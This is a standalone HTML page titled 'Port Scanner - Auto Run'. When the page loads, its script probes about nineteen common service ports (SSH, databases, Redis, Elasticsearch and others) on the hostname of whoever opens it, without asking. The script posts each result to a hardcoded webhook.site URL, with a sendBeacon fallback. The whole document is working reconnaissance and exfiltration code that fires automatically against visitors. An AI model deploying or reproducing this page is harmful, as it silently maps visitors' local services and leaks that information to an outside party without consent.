<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Port Scanner</title>
    <style>
        body { font-family: 'Courier New', monospace; background: #0d1117; color: #c9d1d9; padding: 20px; }
        .container { max-width: 1000px; margin: 0 auto; background: #161b22; border: 1px solid #30363d; border-radius: 6px; padding: 20px; }
        h1 { color: #58a6ff; }
        .log { background: #0d1117; border: 1px solid #30363d; border-radius: 4px; padding: 15px; margin: 15px 0; max-height: 600px; overflow-y: auto; font-size: 12px; }
        .entry { margin: 5px 0; padding: 5px; border-left: 3px solid #30363d; padding-left: 10px; }
        .open { border-left-color: #3fb950; color: #3fb950; }
        .closed { border-left-color: #f85149; color: #f85149; }
        .info { border-left-color: #58a6ff; color: #58a6ff; }
        .webhook { border-left-color: #d29922; color: #d29922; }
        .status { margin: 10px 0; padding: 10px; background: #0d1117; border: 1px solid #30363d; border-radius: 4px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔍 Port Scanner - Auto Run</h1>
        <div class="status">
            <strong>Target:</strong> <span id="target">localhost</span> | 
            <strong>Status:</strong> <span id="status">Starting scan...</span>
        </div>
        <div id="log" class="log">Initializing scanner...</div>
    </div>

    <script>
        const webhookUrl = 'https://webhook.site/4eb0eaf7-b3a6-47d2-85c8-c47759291f94';
        
        async function sendToWebhook(data) {
            try {
                await fetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
            } catch {
                navigator.sendBeacon(webhookUrl, JSON.stringify(data));
            }
        }
        
        async function scanPorts() {
            const hostname = window.location.hostname || "localhost";
            const ports =  [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 5432, 5984, 8080, 8443, 27017, 6379, 9200];
        
            for (const port of ports) {
                let result = {
                    type: "port_scan",
                    host: hostname,
                    port: port,
                    status: "UNKNOWN"
                };
        
                try {
                    const res = await fetch(`http://${hostname}:${port}`, {
                        method: 'HEAD'
                    });
        
                    result.status = "RESPONSE";
                    result.httpStatus = res.status;
                } catch (e) {
                    result.error = e.message;
                }
        
                console.log(result);
                await sendToWebhook(result);
            }
        }
        
        window.onload = scanPorts;
</script>
</body>
</html>
